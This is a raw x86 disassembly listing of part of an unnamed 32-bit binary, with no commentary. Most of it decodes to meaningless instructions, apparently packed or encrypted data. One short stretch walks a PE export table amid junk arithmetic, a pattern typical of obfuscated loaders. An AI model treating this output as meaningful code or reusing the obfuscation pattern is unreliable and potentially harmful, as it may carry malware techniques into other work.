  4140fb:	mov    DWORD PTR ss:[eax+edx*2+0x41af91ff],edi
  414103:	jg     0x414119
  414105:	test   BYTE PTR [esi-0x1a],dl
  414108:	inc    esp
  414109:	jnp    0x41410c
  41410b:	dec    esp
  41410c:	xchg   ebx,eax
  41410d:	mov    bh,0x90
  41410f:	popa   
  414110:	jmp    0x2aa5:0x21905488
  414117:	sub    cl,dl
  414119:	cwde   
  41411a:	pushf  
  41411b:	sbb    eax,DWORD PTR [ecx]
  41411d:	adc    ebx,ebx
  41411f:	xchg   edi,eax
  414120:	lea    edi,[esi-0x76]
  414123:	aaa    
  414124:	xchg   ecx,eax
  414125:	inc    BYTE PTR [ebx+0x1e828b46]
  41412b:	jns    0x4140ad
  41412d:	sub    BYTE PTR [eax+0x7a],dh
  414130:	leave  
  414131:	add    ebx,DWORD PTR ds:0x3e35cb1a
  414137:	dec    eax
  414138:	lea    ecx,[edi]
  41413a:	call   0xe84b:0x7d88c2b
  414141:	push   ebp
  414142:	scas   eax,DWORD PTR es:[edi]
  414143:	or     al,0x96
  414145:	jmp    0x414133
  414147:	inc    edi
  414148:	pop    edi
  414149:	push   esi
  41414a:	or     BYTE PTR [edi],ah
  41414c:	jne    0x4141a1
  41414e:	fxch   st(0)
  414150:	stos   DWORD PTR es:[edi],eax
  414151:	rcr    BYTE PTR [edi-0x4afb31e8],cl
  414157:	adc    DWORD PTR [ebx+0x7314aefa],ebx
  41415d:	or     DWORD PTR [ebx+0x2581ec45],ecx
  414163:	push   ebp
  414164:	cld    
  414165:	inc    edx
  414166:	add    BYTE PTR [eax],al
  414168:	add    BYTE PTR [eax],al
  41416a:	add    BYTE PTR [ebx+0x42fc550d],cl
  414170:	add    BYTE PTR [ecx-0x77],al
  414173:	or     eax,0x42fc55
  414178:	cmp    DWORD PTR ds:0x42fc55,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e4ef
  41418b:	cmp    DWORD PTR ds:0x42fc55,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fc59,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e67f
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
  4141b4:	mov    ecx,DWORD PTR ds:0x42fc69
  4141ba:	sbb    DWORD PTR ds:0x42fc55,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fc85,0x42e693
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e66b,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fc85,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e68f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fc5d,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fc5d
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fc5d,ecx
  41420f:	cmp    DWORD PTR ds:0x42fc5d,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e4f3
  41423b:	cmp    DWORD PTR ds:0x42fc5d,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fc5d
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fc5d,ecx
  414257:	cmp    DWORD PTR ds:0x42fc5d,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x41420f
  414283:	in     al,0x97
  414285:	cmp    eax,0x70707380
  41428a:	mov    ecx,0xd270707e
  41428f:	pop    ebx
  414290:	or     DWORD PTR [eax+eax*1+0x3e1075df],esp
  414297:	hlt    
  414298:	push   ebp
  414299:	xchg   DWORD PTR [ecx],edi
  41429b:	cmp    edi,DWORD PTR [ebx-0x773716c2]
  4142a1:	(bad)  
  4142a2:	cmp    DWORD PTR [edx],edx
  4142a4:	push   ebx
  4142a5:	mov    dl,0x90
  4142a7:	idiv   BYTE PTR [ecx]
  4142a9:	xor    eax,0x901870bb
  4142ae:	add    dl,cl
  4142b0:	gs shr ecx,1
  4142b3:	and    dl,0x8d
  4142b6:	lods   eax,DWORD PTR ds:[esi]
  4142b7:	cld    
  4142b8:	push   esp
  4142b9:	ror    ebx,cl
  4142bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142bc:	mov    bh,0x90
  4142be:	pop    ebp
  4142bf:	sub    edx,edx
  4142c1:	dec    esp
  4142c2:	(bad)  
  4142c4:	add    eax,0xb778f0f0
  4142c9:	add    al,0x75
  4142cb:	mov    ds:0xeebbb68e,eax
  4142d0:	jmp    0x4142ad
  4142d2:	xor    ch,cl
  4142d4:	imul   esp,DWORD PTR [edx-0x4fe98a3e],0x2f
  4142db:	jbe    0x41431c
  4142dd:	ss dec ebx
  4142df:	out    dx,al
  4142e0:	add    BYTE PTR [ecx+0x5ecb3359],ch
  4142e6:	clc    
  4142e7:	xor    eax,0x20c6bdf6
  4142ec:	mov    BYTE PTR [eax+0x43],dh
  4142ef:	int3   
  4142f0:	dec    esp
  4142f1:	add    ah,BYTE PTR fs:[esi-0x72]
  4142f5:	jno    0x41431e
  4142f7:	xlat   BYTE PTR ds:[ebx]
  4142f8:	dec    ecx
  4142f9:	jp     0x4142db
  4142fb:	outs   dx,BYTE PTR ds:[esi]
  4142fc:	gs in  eax,dx
  4142fe:	sti    
  4142ff:	mov    esp,0xbc856462
  414304:	or     eax,ebp
  414306:	repnz les ecx,FWORD PTR [ebx-0x9]
  41430a:	cmp    esp,ebx
  41430c:	(bad)  
  41430d:	out    0x90,eax
  41430f:	sahf   
  414310:	leave  
  414311:	fwait
  414312:	cmp    al,al
  414314:	or     DWORD PTR [ecx+0x7a9f66f7],ebp
  41431a:	inc    ebx
  41431b:	loop   0x414363
  41431d:	lods   eax,DWORD PTR ds:[esi]
  41431e:	xchg   ebx,eax
  41431f:	pop    ss
  414320:	adc    ah,BYTE PTR [ecx-0xe]
  414323:	inc    ebp
  414324:	mov    cl,0xb
  414326:	mov    ds:0x2181b75a,eax
  41432b:	ja     0x414302
  41432d:	inc    ebx
  41432e:	mov    ah,BYTE PTR [ebx]
  414330:	sbb    eax,0xf3ff2dc6
  414335:	cmp    cl,BYTE PTR [esi]
  414337:	test   eax,0x8c72ef2
  41433c:	out    0x16,al
  41433e:	cwde   
  41433f:	sub    BYTE PTR ds:[ecx+0x74070424],dl
  414346:	xchg   ecx,eax
  414347:	add    BYTE PTR [ecx+0x6a],bh
  41434a:	mov    ch,BYTE PTR [ebp-0x49d05bba]
  414350:	ds inc eax
  414352:	xchg   BYTE PTR ss:[ebx-0x1389125],bl
  414359:	cmc    
  41435a:	popf   
  41435b:	pop    esp
  41435c:	pop    eax
  41435d:	dec    edx
  41435e:	imul   esi,DWORD PTR [ebx+0x25],0xffffffa3
  414362:	inc    edx
  414363:	sti    
  414364:	adc    BYTE PTR [ecx-0x19d29623],ah
  41436a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41436b:	sub    ch,al
  41436d:	cmp    edx,DWORD PTR [eax-0x6]
  414370:	std    
  414371:	xor    DWORD PTR [edx+0x1e499085],esp
  414377:	adc    dh,bh
  414379:	lock pop ecx
  41437b:	and    eax,0x8b601f36
  414380:	and    al,0xb2
  414382:	shl    DWORD PTR [ecx-0x1ef5f32a],cl
  414388:	fnstcw WORD PTR [edi+0x7b]
  41438b:	xchg   ebx,eax
  41438c:	jmp    0xacf7:0xd2886aee
  414393:	add    DWORD PTR [esi+eax*2+0x4f],ebp
  414397:	cmp    BYTE PTR [esp+edx*8],cl
  41439a:	xor    BYTE PTR [edi],0x64
  41439d:	push   es
  41439e:	ins    DWORD PTR es:[edi],dx
  41439f:	pop    esi
  4143a0:	push   ebp
  4143a1:	mov    bh,0xa2
  4143a3:	xor    eax,edx
  4143a5:	pop    es
  4143a6:	pop    es
  4143a7:	mov    ecx,0xb4dd63a9
  4143ac:	jle    0x4143e9
  4143ae:	adc    al,0x98
  4143b0:	lock stos DWORD PTR es:[edi],eax
  4143b2:	bound  esp,QWORD PTR [esi+0x5a]
  4143b5:	mov    dh,al
  4143b7:	arpl   bp,bp
  4143b9:	add    BYTE PTR [eax-0x2d],ch
  4143bc:	cmc    
  4143bd:	stos   DWORD PTR es:[edi],eax
  4143be:	push   0x4f
  4143c0:	push   es
  4143c1:	adc    ebx,ecx
  4143c3:	push   es
  4143c4:	sub    ecx,ecx
  4143c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143c7:	mov    ebx,0x93a88826
  4143cc:	push   cs
  4143cd:	mov    al,ds:0x82c595cf
  4143d2:	aas    
  4143d3:	aad    0xcc
  4143d5:	inc    esp
  4143d6:	loope  0x414401
  4143d8:	push   esp
  4143d9:	mov    ds:0x85d38138,al
  4143de:	fadd   DWORD PTR [edi-0x30]
  4143e1:	retf   
  4143e2:	cmp    DWORD PTR [edx],esp
  4143e4:	cdq    
  4143e5:	out    dx,eax
  4143e6:	mov    edi,0x26575631
  4143eb:	mov    eax,ds:0xfdb8b44a
  4143f0:	call   0x1cac1393
  4143f5:	sbb    al,0x11
  4143f7:	dec    esi
  4143f8:	jae    0x414426
  4143fa:	inc    edx
  4143fb:	ror    DWORD PTR [edx-0x6860c3c9],cl
  414401:	fcom   QWORD PTR [eax+ebx*1-0x4a]
  414405:	fimul  WORD PTR [eax+ecx*2+0x5d]
  414409:	pop    ebx
  41440a:	dec    edi
  41440b:	jae    0x414409
  41440d:	pop    es
  41440e:	add    eax,0xe2702403
  414413:	lods   eax,DWORD PTR ds:[esi]
  414414:	call   0xe9260d18
  414419:	fidivr DWORD PTR [ecx-0x5]
  41441c:	jecxz  0x4143b2
  41441e:	sub    eax,0x1a75ee37
  414423:	push   0xb66c26c4
  414428:	ret    0x96a
  41442b:	mov    esi,0x54319acd
  414430:	loopne 0x41442b
  414432:	push   0x16
  414434:	mov    dl,0x48
  414436:	leave  
  414437:	sar    DWORD PTR [esi+0x135cb345],cl
  41443d:	lock jle 0x4143cc
  414440:	cmp    ecx,ebx
  414442:	inc    esi
  414443:	add    al,0x87
  414445:	mov    edx,DWORD PTR [esi+0x40745dd]
  41444b:	mov    ecx,0xff2d7b20
  414450:	in     eax,0xe9
  414452:	lahf   
  414453:	adc    ebp,eax
  414455:	mov    bh,bl
  414457:	mov    ebp,0xbc756672
  41445c:	add    BYTE PTR [edi-0x77d46751],bl
  414462:	mov    edx,0xbdcec6c8
  414467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414468:	or     BYTE PTR [ecx-0x29],cl
  41446b:	sar    bl,1
  41446d:	scas   eax,DWORD PTR es:[edi]
  41446e:	cmp    al,0x5e
  414470:	pop    esp
  414471:	jmp    0x2a576796
  414476:	jp     0x414441
  414478:	arpl   WORD PTR [ecx+0x41],cx
  41447b:	outs   dx,BYTE PTR ds:[esi]
  41447c:	xlat   BYTE PTR ds:[ebx]
  41447d:	or     al,0x8b
  41447f:	or     esi,ecx
  414481:	sub    esp,DWORD PTR [esi]
  414483:	int    0xcd
  414485:	cdq    
  414486:	inc    ebp
  414487:	mov    esp,0x5466ba81
  41448c:	(bad)  
  41448d:	leave  
  41448e:	out    0x9,eax
  414490:	fist   DWORD PTR [edx+0x1103e973]
  414496:	sub    ch,BYTE PTR [bp-0x3642]
  41449b:	jecxz  0x4144ce
  41449d:	xor    eax,0x7e82c76
  4144a2:	mov    ds:0x5523be9,eax
  4144a7:	arpl   bx,bp
  4144a9:	adc    ecx,DWORD PTR [edx]
  4144ab:	mov    ah,0x5e
  4144ad:	xchg   esi,eax
  4144ae:	retf   0x5688
  4144b1:	test   al,0x66
  4144b3:	ret    0x2971
  4144b6:	dec    ecx
  4144b7:	adc    esp,DWORD PTR [eax-0x61118d57]
  4144bd:	xchg   BYTE PTR [edi],ah
  4144bf:	add    ecx,esi
  4144c1:	mov    ebp,0xf0738585
  4144c6:	sub    DWORD PTR [esi-0x2de4f1cb],eax
  4144cc:	(bad)
  4144d0:	pop    ebp
  4144d1:	add    BYTE PTR [edi],0x10
  4144d4:	inc    eax
  4144d5:	out    0x95,eax
  4144d7:	in     al,dx
  4144d8:	ss dec ecx
  4144da:	aas    
  4144db:	or     DWORD PTR [ebx+0x6c8bcaa7],ebp
  4144e1:	inc    edi
  4144e2:	test   al,0xb7
  4144e4:	mov    bl,0x52
  4144e6:	jno    0x4144ec
  4144e8:	(bad)  
  4144e9:	out    0x64,eax
  4144eb:	pop    ebp
  4144ec:	xchg   DWORD PTR [esi-0x59332812],esp
  4144f2:	fwait
  4144f3:	js     0x414559
  4144f5:	xchg   ebp,eax
  4144f6:	jo     0x41447c
  4144f8:	inc    ecx
  4144f9:	in     eax,dx
  4144fa:	popa   
  4144fb:	mov    ds:0xf15f791e,al
  414500:	cmp    eax,0xcbf1045e
  414505:	sbb    edi,DWORD PTR [eax+0x74]
  414508:	xor    dl,BYTE PTR [edi-0x63]
  41450b:	cmp    DWORD PTR [ecx],0xffffffd6
  41450e:	mov    WORD PTR [ecx-0x535c2b40],gs
  414514:	outs   dx,DWORD PTR ds:[esi]
  414515:	adc    DWORD PTR [ebx-0x7f],ecx
  414518:	mov    edi,DWORD PTR [edi]
  41451a:	pushf  
  41451b:	xchg   ebp,eax
  41451c:	push   esi
  41451d:	pop    edi
  41451e:	mov    esi,0x4a294aaa
  414523:	mov    bh,0x2e
  414525:	or     ebx,DWORD PTR [ebx-0x23]
  414528:	pop    eax
  414529:	scas   eax,DWORD PTR es:[edi]
  41452a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41452b:	dec    edi
  41452c:	aad    0xe0
  41452e:	lock into 
  414530:	mov    bl,0xef
  414532:	mov    bh,BYTE PTR [eax+0x23]
  414535:	inc    eax
  414536:	dec    ebp
  414537:	mov    ds:0x39ce3712,al
  41453c:	test   BYTE PTR [ecx+eiz*4+0x62],dl
  414540:	in     al,0x38
  414542:	leave  
  414543:	popa   
  414544:	lea    ebx,[eax+0x11]
  414547:	out    0x4f,al
  414549:	mov    esi,0xf78df543
  41454e:	clc    
  41454f:	fcom   QWORD PTR [esi]
  414551:	(bad)  
  414552:	jmp    0x414570
  414554:	add    eax,0xffd075ff
  414559:	jne    0x414567
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0x159cbeb4
  414576:	cmp    esi,edx
  414578:	leave  
  414579:	jo     0x4145fa
  41457b:	jo     0x414536
  41457d:	jle    0x4145ef
  41457f:	jo     0x4145bc
  414581:	enter  0x6638,0xd3
  414585:	imul   esi,DWORD PTR [ebx-0x5289248c],0x594c345b
  41458f:	aaa    
  414590:	dec    edi
  414591:	jo     0x4145fc
  414593:	(bad)  
  414594:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414595:	mov    ds:0xe46616b8,eax
  41459a:	add    DWORD PTR [edi+0x28],ebx
  41459d:	cmc    
  41459e:	jmp    0xd6b0:0x1298943d
  4145a5:	jbe    0x414577
  4145a7:	sub    al,0x5d
  4145a9:	dec    ebx
  4145aa:	and    al,0xa
  4145ac:	test   eax,0x413cc885
  4145b1:	xchg   ebp,eax
  4145b2:	sub    cl,BYTE PTR [edi+0x6f]
  4145b5:	test   DWORD PTR [esi+0x5ee18f51],ebp
  4145bb:	push   es
  4145bc:	pop    esp
  4145bd:	std    
  4145be:	jmp    0xdd1a7d5e
  4145c3:	into   
  4145c4:	in     al,0x46
  4145c6:	fs cmc 
  4145c8:	rcr    DWORD PTR [esi],0x4c
  4145cb:	push   ecx
  4145cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145cd:	enter  0x3e80,0x5a
  4145d1:	(bad)  
  4145d2:	mov    esi,0x3f8874f7
  4145d7:	jmp    0xda831807
  4145dc:	jge    0x4145ea
  4145de:	clc    
  4145df:	jbe    0x414640
  4145e1:	mov    ebx,0x69fa2277
  4145e6:	into   
  4145e7:	or     bl,BYTE PTR [ebx+0x7d8a095]
  4145ed:	jo     0x4145e3
  4145ef:	jns    0x414586
  4145f1:	pop    edx
  4145f2:	test   BYTE PTR [ebx-0x79],al
  4145f5:	retf   0x2718
  4145f8:	add    eax,ebp
  4145fa:	and    edx,DWORD PTR [esi+ecx*2-0x5eb2ee5d]
  414601:	mov    eax,DWORD PTR [esp+ebp*8-0xb]
  414605:	sub    ch,cl
  414607:	call   0xf3f60598
  41460c:	mov    eax,0x828965
  414611:	inc    eax
  414612:	jmp    0xe5fd:0x1b291822
  414619:	loopne 0x4145a1
  41461b:	lods   eax,DWORD PTR ds:[esi]
  41461c:	pop    ecx
  41461d:	daa    
  41461e:	hlt    
  41461f:	mov    ebp,0xedfb8172
  414624:	call   FWORD PTR [eax+0xf2e7fb1]
  41462a:	adc    ecx,DWORD PTR [esi+ebp*1+0x56d163b5]
  414631:	pushf  
  414632:	xor    eax,0x78ba936a
  414637:	push   cs
  414638:	retf   
  414639:	(bad)  
  41463b:	mov    ecx,edx
  41463d:	xor    al,0x86
  41463f:	xchg   esp,eax
  414640:	or     ebx,0xffffffad
  414643:	dec    ebp
  414644:	loopne 0x414676
  414646:	out    dx,al
  414647:	jnp    0x41464b
  414649:	les    edi,FWORD PTR [eax+0x34bc031]
  41464f:	mov    ecx,0x1a7cbedc
  414654:	xchg   ecx,eax
  414655:	rcr    ebp,1
  414657:	dec    esp
  414658:	mov    cl,0x78
  41465a:	push   ebp
  41465b:	mov    ebp,0x4d87b811
  414660:	gs mov dl,0x44
  414663:	lods   eax,DWORD PTR ds:[esi]
  414664:	leave  
  414665:	push   cs
  414666:	or     BYTE PTR [edx-0x5c],0x0
  41466a:	ret    
  41466b:	sbb    al,0x66
  41466d:	pop    ebp
  41466e:	pusha  
  41466f:	aad    0xc7
  414671:	jle    0x4146c0
  414673:	lds    ecx,FWORD PTR [ecx+0x2c]
  414676:	ins    DWORD PTR es:[edi],dx
  414677:	add    eax,0xf5c193ce
  41467c:	sahf   
  41467d:	cmp    eax,0xdc480973
  414682:	loopne 0x4146eb
  414684:	push   es
  414685:	bound  ebp,QWORD PTR [ebx+0x5a]
  414688:	mov    ah,0x45
  41468a:	or     cl,ch
  41468c:	rol    DWORD PTR [edx-0x5b],1
  41468f:	sbb    al,0xa0
  414691:	ds and eax,0xf2835de0
  414697:	cmc    
  414698:	and    al,0x6c
  41469a:	aad    0xed
  41469c:	cwde   
  41469d:	in     eax,dx
  41469e:	cdq    
  41469f:	in     eax,0x3b
  4146a1:	imul   esp,esp,0x1703bea6
  4146a7:	jbe    0x414687
  4146a9:	and    DWORD PTR [ebx+eiz*8-0x5b06fe91],edx
  4146b0:	retf   0x9dea
  4146b3:	jns    0x6c72356b
  4146b9:	dec    ebp
  4146ba:	iret   
  4146bb:	stos   DWORD PTR es:[edi],eax
  4146bc:	inc    esi
  4146bd:	and    al,0xfe
  4146bf:	mov    ds:0xc4f14059,al
  4146c4:	not    BYTE PTR [edx+ebx*2-0x19f447c7]
  4146cb:	test   al,0x18
  4146cd:	(bad)  
  4146ce:	lea    ebx,[esi+ebp*8-0x4b]
  4146d2:	gs inc ecx
  4146d4:	ds int3 
  4146d6:	popa   
  4146d7:	nop
  4146d8:	dec    ebx
  4146d9:	adc    eax,0xd5500663
  4146de:	loope  0x414748
  4146e0:	mov    edx,0x73d97bcd
  4146e5:	je     0x4146c4
  4146e7:	push   0x3
  4146e9:	push   eax
  4146ea:	fucomip st,st(4)
  4146ec:	lods   al,BYTE PTR ds:[esi]
  4146ed:	xchg   esi,eax
  4146ee:	in     eax,dx
  4146ef:	sub    cl,BYTE PTR [esi+esi*1-0x1f8dab9d]
  4146f6:	jns    0x414698
  4146f8:	jno    0x414736
  4146fa:	mov    cs,WORD PTR [edx-0x67e066b1]
  414700:	push   ecx
  414701:	inc    esp
  414702:	xchg   ebx,eax
  414703:	nop
  414704:	mov    ecx,DWORD PTR [edx]
  414706:	cwde   
  414707:	mov    ds:0x26415070,eax
  41470c:	into   
  41470d:	mov    eax,ds:0xb43616d6
  414712:	jae    0x4146bd
  414714:	adc    BYTE PTR [esi],bl
  414716:	cmp    ch,ah
  414718:	ds in  eax,0xce
  41471b:	shl    DWORD PTR [ebx+0x346744aa],cl
  414721:	adc    edx,esi
  414723:	das    
  414724:	inc    ebx
  414725:	gs sub al,0x4d
  414728:	jmp    0x4146cc
  41472a:	push   ebp
  41472b:	(bad)  
  41472c:	rol    DWORD PTR [esp+ebx*2],cl
  41472f:	jno    0x4146b6
  414731:	jns    0x41479c
  414733:	mov    ecx,0x8cedc1dc
  414738:	in     al,0x3c
  41473a:	das    
  41473b:	xchg   ebx,eax
  41473c:	pop    edx
  41473d:	scas   al,BYTE PTR es:[edi]
  41473e:	sbb    cl,dl
  414740:	inc    ebx
  414741:	or     al,0xbd
  414743:	adc    al,0x57
  414745:	cli    
  414746:	xlat   BYTE PTR ds:[ebx]
  414747:	jl     0x4146fd
  414749:	xor    DWORD PTR [esi-0x30],esi
  41474c:	or     cl,BYTE PTR [ecx]
  41474e:	or     bl,BYTE PTR [ecx]
  414750:	sti    
  414751:	adc    eax,0x1daf2512
  414756:	xor    esp,DWORD PTR [edx+0x1091acf3]
  41475c:	into   
  41475d:	adc    ecx,ebx
  41475f:	inc    eax
  414760:	push   esi
  414761:	rcr    BYTE PTR [esi],0x7e
  414764:	(bad)  [ebp-0x5761129b]
  41476a:	sub    DWORD PTR [ebp*4-0x342c27bc],edi
  414771:	jno    0x4146f8
  414773:	fst    DWORD PTR ds:[ebx-0x424a9ee5]
  41477a:	jp     0x414720
  41477c:	idiv   BYTE PTR [eax-0x47]
  41477f:	and    eax,0xbe9a014f
  414784:	shrd   DWORD PTR [edi],edx,cl
  414787:	or     al,0x14
  414789:	cmp    ecx,DWORD PTR [ecx+0x51903c27]
  41478f:	or     dl,BYTE PTR [esi+0x72b34df2]
  414795:	push   ss
  414796:	test   BYTE PTR ds:0x65b67d43,cl
  41479c:	aam    0x25
  41479e:	test   eax,0x7b5665fb
  4147a3:	mov    dl,0x70
  4147a5:	out    0xd6,al
  4147a7:	ficomp WORD PTR [esi-0x25]
  4147aa:	cmp    al,0xa7
  4147ac:	daa    
  4147ad:	inc    BYTE PTR [eax+0x22]
  4147b0:	shl    BYTE PTR [edx],cl
  4147b2:	push   esp
  4147b3:	leave  
  4147b4:	aaa    
  4147b5:	daa    
  4147b6:	fcomp  DWORD PTR [eax-0x3e3b68ac]
  4147bc:	jge    0x414764
  4147be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147bf:	add    eax,0x4186fdcf
  4147c4:	push   0x2b721282
  4147c9:	lods   eax,DWORD PTR ds:[esi]
  4147ca:	inc    ebp
  4147cb:	push   0xffffffc5
  4147cd:	push   0xffffffda
  4147cf:	xchg   edi,eax
  4147d0:	push   edi
  4147d1:	add    ebx,DWORD PTR [esi+0x71b976f5]
  4147d7:	cwde   
  4147d8:	fist   DWORD PTR [edi-0x16]
  4147db:	ss mov dl,0x1a
  4147de:	xchg   ecx,eax
  4147df:	sub    eax,0x2a2ccd33
  4147e4:	ja     0x4147b7
  4147e6:	int3   
  4147e7:	out    dx,eax
  4147e8:	les    ecx,FWORD PTR [edi]
  4147ea:	ja     0x4147f5
  4147ec:	dec    edi
  4147ed:	jb     0x41483b
  4147ef:	sbb    bh,BYTE PTR [ecx]
  4147f1:	or     al,0xa9
  4147f3:	fnstsw WORD PTR [esp+edi*4]
  4147f6:	shl    DWORD PTR [ebp-0x39c0a3f8],cl
  4147fc:	mov    edx,0x7fe27d1c
  414801:	ins    BYTE PTR es:[edi],dx
  414802:	and    al,0x4b
  414804:	mov    ebp,DWORD PTR [ecx-0x4d1f9688]
  41480a:	jle    0x4147d5
  41480c:	ins    DWORD PTR es:[edi],dx
  41480d:	int    0x57
  41480f:	jge    0x414804
  414811:	mov    eax,0xe02fc9e4
  414816:	mov    ds:0xf11a6db6,al
  41481b:	scas   eax,DWORD PTR es:[edi]
  41481c:	add    al,0xe9
  41481e:	pop    edx
  41481f:	aam    0xf6
  414821:	shl    BYTE PTR [edi-0x25],0x51
  414825:	arpl   dx,cx
  414827:	je     0x41485a
  414829:	mov    ds:0xf3c1bdec,al
  41482e:	jg     0x414897
  414830:	mov    ecx,0x938216c4
  414835:	jge    0x4147c8
  414837:	fwait
  414838:	mov    bh,0xfe
  41483a:	sbb    BYTE PTR [edx-0x392b1f96],al
  414840:	aas    
  414841:	mov    ecx,0x1206cc8a
  414846:	jecxz  0x4147d3
  414848:	dec    ebp
  414849:	clc    
  41484a:	xor    eax,0x7510855
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x41481f
  414861:	dec    edi
  414862:	xchg   edx,eax
  414863:	or     eax,0x707f7d12
  414868:	mov    ecx,0x4470707e
  41486d:	fst    DWORD PTR [ebx]
  41486f:	or     dh,dl
  414871:	or     edi,DWORD PTR [ecx-0x5b1e64df]
  414877:	test   ah,bl
  414879:	out    0xe3,al
  41487b:	push   edx
  41487c:	mov    ah,0x7
  41487e:	jmp    0x641bb667
  414883:	inc    eax
  414884:	sub    DWORD PTR [ebx],esi
  414886:	pop    ebx
  414887:	jb     0x4148ed
  414889:	nop
  41488a:	scas   al,BYTE PTR es:[edi]
  41488b:	(bad)  
  41488c:	jae    0x41490c
  41488e:	push   es
  41488f:	inc    esp
  414890:	pop    esi
  414891:	mov    ds:0x58270a2a,eax
  414896:	test   DWORD PTR [edi],ecx
  414898:	xor    ecx,DWORD PTR [edi]
  41489a:	xchg   DWORD PTR ds:0xfa80ceca,ebp
  4148a0:	(bad)  
  4148a1:	in     eax,0xd3
  4148a3:	xchg   ebp,eax
  4148a4:	dec    ebx
  4148a5:	daa    
  4148a6:	sbb    eax,0xa0a55072
  4148ab:	into   
  4148ac:	push   ebp
  4148ad:	push   eax
  4148ae:	inc    edx
  4148af:	and    DWORD PTR ds:0x3cfb6f57,edx
  4148b5:	and    edx,ebp
  4148b7:	or     DWORD PTR [edx+0x18],edi
  4148ba:	retf   
  4148bb:	shl    bh,1
  4148bd:	mov    ah,0xd7
  4148bf:	jmp    0x2c66:0x698e6ae1
  4148c6:	and    al,0x37
  4148c8:	jmp    0x7c58:0x6f051039
  4148cf:	mov    ss,WORD PTR [edx]
  4148d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148d2:	sub    al,0x14
  4148d4:	dec    ebx
  4148d5:	pop    eax
  4148d6:	adc    dl,BYTE PTR [ebp+0x1f]
  4148d9:	sub    BYTE PTR [eax],al
  4148db:	neg    BYTE PTR [ecx]
  4148dd:	cmp    al,0xdd
  4148df:	cmp    eax,0xbb73b696
  4148e4:	fcomp  DWORD PTR [ebp-0x6d]
  4148e7:	in     al,dx
  4148e8:	sub    bh,BYTE PTR [ecx+0x69]
  4148eb:	xor    DWORD PTR [edi],eax
  4148ed:	push   eax
  4148ee:	inc    ebp
  4148ef:	or     DWORD PTR [edi+ecx*4-0x72],ecx
  4148f3:	and    al,0xc2
  4148f5:	loop   0x414962
  4148f7:	neg    BYTE PTR [edx]
  4148f9:	push   ebx
  4148fa:	pop    edi
  4148fb:	push   0xffffffbe
  4148fd:	cmp    BYTE PTR [ebp+0x7d],al
  414900:	test   esp,ebx
  414902:	sti    
  414903:	outs   dx,DWORD PTR ds:[esi]
  414904:	cs sti 
  414906:	test   dl,ch
  414908:	pop    ds
  414909:	pop    esi
  41490a:	sub    eax,0xdbf674bc
  41490f:	push   edx
  414910:	aad    0x7e
  414912:	mov    edx,0x1b5d9433
  414917:	push   ds
  414918:	repnz xchg esi,eax
  41491a:	inc    eax
  41491b:	data16 mov bh,0x94
  41491e:	xchg   ecx,eax
  41491f:	cwde   
  414920:	fdivr  QWORD PTR [edi+0xb7fe128]
  414926:	pop    ds
  414927:	push   ebx
  414928:	inc    edx
  414929:	cmp    edx,0x1f1b379a
  41492f:	retf   0xee72
  414932:	inc    ebx
  414933:	daa    
  414934:	rol    BYTE PTR [eax],1
  414936:	stos   DWORD PTR es:[edi],eax
  414937:	aaa    
  414938:	stc    
  414939:	test   al,0x6d
  41493b:	(bad)
  41493e:	mov    bl,BYTE PTR [eax+0x27]
  414941:	bswap  edi
